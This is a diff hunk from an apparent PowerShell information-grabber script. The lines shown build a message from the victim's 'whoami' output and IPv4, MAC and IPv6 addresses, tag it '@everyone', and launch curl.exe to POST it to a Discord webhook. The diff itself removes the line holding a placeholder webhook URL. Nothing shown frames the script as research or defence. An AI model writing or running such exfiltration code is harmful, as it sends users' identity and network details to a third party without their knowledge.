@@ -38,7 +38,6 @@ $info    = "IPS: $($ipv4 -join ', ') | MACS: $($mac -join ', ') | IPv6: $($ipv6 
 $content = "$($whoami_content) | $info | @everyone"
 
 # Specify the Discord webhook (should be set somewhere, example variable below)
-$wh = "<PUT_WEBHOOK_URL_HERE>"
 
 Start-Process curl.exe -ArgumentList @(
     '-X', 'POST',
